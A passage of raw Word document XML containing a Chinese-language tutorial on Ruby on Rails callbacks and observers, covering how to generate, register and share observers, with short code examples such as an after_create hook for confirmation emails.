              <w:t>PictureFileCallbacks</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7882D4E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0854A26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9602C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>回调类中，声明的回调方法的数量是不限制的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E6823D"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18 观察者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731F2291"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观察者</w:t>
      </w:r>
      <w:r w:rsidRPr="00D14D6B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>类似于回调</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，但是他们之间又有很重要的区别。</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>回调会给模型中引入和模型没有直接关系的代码</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，而</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>观察者则可以在不更改模型代码的条件下可以达到相同的目的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。例如，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型不应该包含发送注册确认邮件的代码。所以</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>当你使用的回调写了和模型不直接相关的代码时，你可能应该考虑使用观察者来代替它</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7E0EAA"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18.1 创建观察者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B05382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例如，我们想在每位新用户被创建的时候，都会发送一封确认邮件。但是发送确认邮件并非和用户模型逻辑直接相关，所以我们应该创建一个观察者来实现这部分功能。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="44A86B2A" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7247B99B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1017922771"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">$ rails generate </w:t>
            </w:r>
            <w:r w:rsidRPr="00B06FFF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>observer</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> User</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C240DD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上面的命令会生成包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>UserObserver</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/user_</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>observer</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="6F709272" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E33B3F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UserObserver &lt; ActiveRecord::Observer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="008AFF4B"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4CAF141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添加在适当时间需要被调用的方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5496"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="19BB09CC" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73A2219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UserObserver &lt; ActiveRecord::Observer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DEFDEB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B06FFF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_create</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>(model)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="664027A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 code to send confirmation email...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="463E710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64833CA9"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377387E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和回调类一样，</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>观察者类中的方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>也是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>接收被观察的模型对象作为参数</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6630F2D1"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18.2 注册观察者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE03694"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B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">观察者通常放置在 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>app/models</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹下面</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">并在 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中注册</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。例如，上面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>UserObserver</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 应该保存为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/user_observer.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件并在文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中如下注册：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="26AC0151" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A9AD93A"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xml:space="preserve"># 注册激活后的观察者会一直运行下去。 </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="218C83E1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B06FFF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>config</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidRPr="00B06FFF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>active_record</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidRPr="00B06FFF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>observers</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> = :user_observer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2FBB4B35"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通常来说，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>environments</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中配置的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>优先级高于</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06FFF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>application</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的配置。所以，如果你并不想让观察者在所有的环境下运行，只需要在指定的环境文件中配置即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F40EE5F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>18.3 分享观察者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39057C3E"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693BD5">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>默认</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>情况下，</w:t>
      </w:r>
      <w:r w:rsidRPr="00693BD5">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Rails 仅通过“观察者”的名称确定需要观察的模型</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。但是，</w:t>
      </w:r>
      <w:r w:rsidRPr="00693BD5">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>观察者也可以被用来给多个模型添加同一行为</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00693BD5">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>我们可以明确的指定需要观察的多个模型</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">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5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="35F236A4" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="227C262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693BD5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>Mailer</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Observer &lt; ActiveRecord::Observer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FD1430C"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693BD5">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
